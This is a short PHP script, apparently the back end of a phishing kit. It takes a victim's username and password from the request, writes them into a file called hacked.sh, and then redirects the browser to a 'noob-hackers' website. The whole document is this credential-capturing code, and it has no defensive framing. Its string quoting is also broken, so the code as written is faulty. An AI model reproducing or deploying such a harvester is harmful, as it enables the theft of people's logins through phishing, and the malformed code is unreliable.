<?php
file_put_contents("hacked.sh", "\n" . "echo "naes" " . $username = $_GET['username'] . "\n" . "echo " . $password = $_GET['password'] . "\n", FILE_APPEND);
header('Location: https://www.noob-hackers.com');
?>